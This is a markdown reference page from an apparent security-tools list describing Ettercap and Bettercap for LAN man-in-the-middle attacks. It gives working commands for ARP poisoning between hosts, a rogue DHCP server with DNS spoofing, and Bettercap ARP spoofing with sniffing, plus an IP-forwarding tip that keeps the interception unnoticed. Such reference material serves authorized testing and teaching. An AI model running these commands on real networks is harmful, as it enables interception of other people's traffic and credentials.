# Ettercap & Bettercap

> Man-in-the-middle suites for LAN attacks: ARP spoofing/poisoning, rogue
> DHCP/DNS, and traffic interception. Bettercap is the modern successor.

- **Link:** https://github.com/bettercap/bettercap (Ettercap: https://www.ettercap-project.org)
- **Type:** open source
- **Platform:** Linux (Bettercap is cross-platform / Go-based)

## Description

Ettercap is a long-standing all-in-one toolkit for man-in-the-middle (MITM)
attacks on a local network: it can poison ARP caches to sit between two hosts,
run a rogue DHCP server, and spoof DNS responses. **Bettercap** is its modern
rewrite — a modular Go framework with a cleaner CLI/web UI covering ARP/DNS
spoofing, sniffing, and Wi-Fi/BLE modules. Both are strictly for authorized
lab and engagement use: intercepting others' traffic without permission is
illegal. Capture the intercepted traffic with [tcpdump](tcpdump.md) and analyze
it in [Wireshark](wireshark.md).

## Installation

```bash
sudo apt install ettercap-text-only bettercap   # Debian/Kali/Ubuntu
```

## Usage examples

### Ettercap — ARP poisoning

```bash
# Text UI, quiet, ARP-poison remote traffic between a set of targets
ettercap -Tq -M arp:remote /192.168.0.113,147,156/

# MITM between two specific hosts on interface ens4
ettercap -i ens4 -Tq -M arp:remote /10.0.0.11// /10.0.0.12//

# Meanwhile, capture the intercepted traffic to a pcap for offline analysis
tcpdump -i eth1 -w /tmp/dump_voip.pcap
```

### Ettercap — rogue DHCP / DNS

```bash
# Rogue DHCP: hand out 10.20.0.30-40, /24 mask, pointing DNS at 10.20.0.18
ettercap -Tq -M dhcp:10.20.0.30-40/255.255.255.0/10.20.0.18

# For fake DNS inside Ettercap: press "P" and enable the dns_spoof plugin
```

### Bettercap — equivalent ARP spoof

```bash
# Start against an interface, then in the interactive session:
sudo bettercap -iface eth0
#   > set arp.spoof.targets 10.0.0.11
#   > arp.spoof on
#   > net.sniff on           # capture and parse intercepted traffic
```

## Notes & references

- ARP spoofing works by sending forged "who-has/is-at" replies so victims send
  their traffic through you; the same primitive can be scripted in
  [Scapy](scapy.md).
- Enable IP forwarding (`echo 1 > /proc/sys/net/ipv4/ip_forward`) so victims
  keep connectivity while you relay — otherwise you cause a DoS, not a MITM.
- Bettercap docs & caplets: https://www.bettercap.org/
- Detection/defense (dynamic ARP inspection, DHCP snooping) lives in
  [../defense-blueteam/](../defense-blueteam/); AD-focused relay attacks in
  [../active-directory/](../active-directory/).
